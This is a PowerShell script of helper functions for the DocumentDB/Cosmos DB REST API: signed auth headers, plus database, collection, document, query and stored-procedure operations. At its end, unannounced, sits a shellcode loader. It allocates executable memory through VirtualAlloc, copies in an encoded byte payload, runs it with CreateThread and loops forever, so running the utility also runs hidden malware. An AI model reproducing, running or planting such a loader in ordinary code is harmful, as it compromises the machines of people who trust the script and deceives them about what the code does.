Add-Type -AssemblyName System.Webfunction New-Header{param([string]$action = "get",[string]$resType,[string]$resourceId,[string]$connectionKey)$apiDate = (Get-Date).ToUniversalTime().ToString('R')$keyBytes = [System.Convert]::FromBase64String($connectionKey) $text = @($action.ToLowerInvariant() + `"`n" + $resType.ToLowerInvariant() + `"`n" + $resourceId + `"`n" + $apiDate.ToLowerInvariant() + "`n" + "`n")$body  =[Text.Encoding]::UTF8.GetBytes($text)$hmacsha = new-object -TypeName System.Security.Cryptography.HMACSHA256 -ArgumentList (,$keyBytes) $hash = $hmacsha.ComputeHash($body)$signature = [System.Convert]::ToBase64String($hash)$authz = [System.Web.HttpUtility]::UrlEncode($('type=master&ver=1.0&sig=' + $signature))$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"$headers.Add("Authorization", $authz)$headers.Add("x-ms-version", '2015-12-16')$headers.Add("x-ms-date", $apiDate) return $headers}function Get-DocDBDatabase {param([string] $rooturi,[string] $key,[string ]$dbname )if($dbname){$resourceid = "dbs/$dbname"$uri = $rootUri + '/' + $resourceid$headers = New-Header -resType dbs -resourceId $resourceid -action Get -connectionKey $key } else {$resourceid = "dbs"$uri = $rootUri + '/' + $resourceid$headers = New-Header -resType dbs -action Get -connectionKey $key }   $response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headersreturn $response}function New-DocDBDatabase{param([string] $rooturi,[string] $key,[string ]$dbname)$uri = $rootUri + '/dbs'$headers = New-Header -resType dbs -action Post -connectionKey $key$body = "{`"id`": `"$dbname`"}"$response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bodyreturn $response}function Remove-DocDBDatabase {param([string] $rooturi,[string] $key,[string]$dbname )$resourceid = "dbs/$dbname"$uri =   $rootUri + '/' + $resourceid$headers = New-Header -resType dbs -resourceId $resourceid -action Delete -connectionKey $key $response = Invoke-RestMethod -Uri $uri -Method Delete -Headers $headersreturn $response}function Get-DocDBCollection{param([string] $rooturi,[string] $key,[string ]$dbname,[string] $collection)if($collection){$resourceid = "dbs/$dbname/colls/$collection"$uri = $rootUri + '/' + $resourceid} else {$resourceid = "dbs/$dbname"$uri = $rootUri + '/' + $resourceid + '/colls'}$headers = New-Header -resType colls -resourceId $resourceid -action Get -connectionKey $key$response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headers -Body $body return $response}function New-DocDBCollection{param([string] $rooturi,[string] $key,[string ]$dbname,[string] $collection)$uri = $rootUri + "/dbs/$dbname/colls"$headers = New-Header -resType colls -resourceId "dbs/$dbname" -action Post -connectionKey $key$body = "{`"id`": `"$collection`"}"$response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bodyreturn $response}function Remove-DocDBCollection{param([string] $rooturi,[string] $key,[string ]$dbname,[string] $collection)$resourceid = "dbs/$dbname/colls/$collection"$uri = $rootUri + '/' + $resourceid$headers = New-Header -resType colls -resourceId $resourceid -action Delete -connectionKey $key$response = Invoke-RestMethod -Uri $uri -Method Delete -Headers $headers -Body $body return $response}function Get-DocDBDocument{param([string] $rooturi,[string] $key,[string ]$dbname,[string] $collection,[string] $id)$resourceid = "dbs/$dbname/colls/$collection"if($id){$headers = New-Header -action Get -resType docs -resourceId "$resourceid/docs/$id" -connectionKey $key$uri = $rootUri + "/$resourceid/docs/$id"} else {        $headers = New-Header -action Get -resType docs -resourceId $resourceid -connectionKey $key$uri = $rootUri + "/$resourceid/docs"}$response = Invoke-RestMethod $uri -Method Get -ContentType 'application/json' -Headers $headersreturn $response}function New-DocDBDocument{param([string]$document,[string] $rooturi,[string] $key,[string ]$dbname,[string] $collection)$collName = "dbs/"+$dbname+"/colls/" + $collection$headers = New-Header -action Post -resType docs -resourceId $collName -connectionKey $key$headers.Add("x-ms-documentdb-is-upsert", "true")$uri = $rootUri + "/" + $collName + "/docs"$response = Invoke-RestMethod $uri -Method Post -Body $document -ContentType 'application/json' -Headers $headersreturn $response}function Remove-DocDBDocuments{param([string] $rooturi,[string] $key,[string ]$dbname,[string] $collection,[string] $id )if($id){$docs = Get-DocDBDocument -rooturi $rooturi -key $key -dbname $dbname -collection $collection -id $id        } else {$docs = Get-DocDBDocument -rooturi $rooturi -key $key -dbname $dbname -collection $collection }$response = @()foreach($doc in $docs.documents){$resourceid = "dbs/$dbname/colls/$collection/docs/$($doc.id)"$headers = New-Header -action Delete -resType docs -resourceId $resourceid -connectionKey $key$uri = $rootUri + "/$resourceid"$response += Invoke-RestMethod $uri -Method Delete -Headers $headers}return $response}function Add-DocDBStoredProcedure{param([string] $rooturi,[string] $key,[string ]$dbname,[string] $collection,[string] $storedprocedure)$collName = "dbs/"+$dbname+"/colls/" + $collection$headers = New-Header -action Post -resType sprocs -resourceId $collName -connectionKey $key$uri = $rootUri + "/" + $collName + "/sprocs"$response = Invoke-RestMethod $uri -Method Post -Body $storedprocedure -ContentType 'application/json' -Headers $headersreturn $response}function Invoke-DocDbQuery{param([string]$query,[string] $rooturi,[string] $key,[string ]$dbname,[string] $collection)$collName = "dbs/"+$dbname+"/colls/" + $collection$headers = New-Header -action Post -resType docs -resourceId $collName -connectionKey $key$headers.Add("x-ms-documentdb-isquery", "true")$headers.Add("Content-Type", "application/query+json")$queryjson = "{`"query`": `"$query`"}"$uri = $rootUri + "/" + $collName + "/docs"$response = Invoke-RestMethod $uri -Method Post -Body $queryjson -Headers $headersreturn $response}function Invoke-DocDbStoredProcedure{param([string] $rooturi,[string] $key,[string ]$dbname,[string] $collection,[string]$sproc,[string]$params)$resourceid = "dbs/$dbname/colls/$collection/sprocs/$sproc"$headers = New-Header -action Post -resType sprocs -resourceId $resourceid -connectionKey $key$uri = $rooturi + "/$resourceid"if($params){$response = Invoke-RestMethod $uri -Method Post -Body $params -Headers $headers} else {$response = Invoke-RestMethod $uri -Method Post -Headers $headers}return $response}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x8a,0x4f,0x64,0x39,0xdb,0xd0,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x47,0x13,0x83,0xc7,0x04,0x03,0x47,0x85,0xad,0x91,0xc5,0x71,0xb3,0x5a,0x36,0x81,0xd4,0xd3,0xd3,0xb0,0xd4,0x80,0x90,0xe2,0xe4,0xc3,0xf5,0x0e,0x8e,0x86,0xed,0x85,0xe2,0x0e,0x01,0x2e,0x48,0x69,0x2c,0xaf,0xe1,0x49,0x2f,0x33,0xf8,0x9d,0x8f,0x0a,0x33,0xd0,0xce,0x4b,0x2e,0x19,0x82,0x04,0x24,0x8c,0x33,0x21,0x70,0x0d,0xbf,0x79,0x94,0x15,0x5c,0xc9,0x97,0x34,0xf3,0x42,0xce,0x96,0xf5,0x87,0x7a,0x9f,0xed,0xc4,0x47,0x69,0x85,0x3e,0x33,0x68,0x4f,0x0f,0xbc,0xc7,0xae,0xa0,0x4f,0x19,0xf6,0x06,0xb0,0x6c,0x0e,0x75,0x4d,0x77,0xd5,0x04,0x89,0xf2,0xce,0xae,0x5a,0xa4,0x2a,0x4f,0x8e,0x33,0xb8,0x43,0x7b,0x37,0xe6,0x47,0x7a,0x94,0x9c,0x73,0xf7,0x1b,0x73,0xf2,0x43,0x38,0x57,0x5f,0x17,0x21,0xce,0x05,0xf6,0x5e,0x10,0xe6,0xa7,0xfa,0x5a,0x0a,0xb3,0x76,0x01,0x42,0x70,0xbb,0xba,0x92,0x1e,0xcc,0xc9,0xa0,0x81,0x66,0x46,0x88,0x4a,0xa1,0x91,0xef,0x60,0x15,0x0d,0x0e,0x8b,0x66,0x07,0xd4,0xdf,0x36,0x3f,0xfd,0x5f,0xdd,0xbf,0x02,0x8a,0x72,0x90,0xac,0x65,0x33,0x40,0x0c,0xd6,0xdb,0x8a,0x83,0x09,0xfb,0xb4,0x4e,0x22,0x96,0x4f,0x18,0x8d,0xcf,0x51,0xdd,0x65,0x12,0x52,0xcc,0x29,0x9b,0xb4,0x84,0xc1,0xcd,0x6f,0x30,0x7b,0x54,0xfb,0xa1,0x84,0x42,0x81,0xe1,0x0f,0x61,0x75,0xaf,0xe7,0x0c,0x65,0x47,0x08,0x5b,0xd7,0xc1,0x17,0x71,0x72,0xed,0x8d,0x7e,0xd5,0xba,0x39,0x7d,0x00,0x8c,0xe5,0x7e,0x67,0x87,0x2c,0xeb,0xc8,0xff,0x50,0xfb,0xc8,0xff,0x06,0x91,0xc8,0x97,0xfe,0xc1,0x9a,0x82,0x00,0xdc,0x8e,0x1f,0x95,0xdf,0xe6,0xcc,0x3e,0x88,0x04,0x2b,0x08,0x17,0xf6,0x1e,0x88,0x6b,0x21,0x66,0xfe,0x85,0xf1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};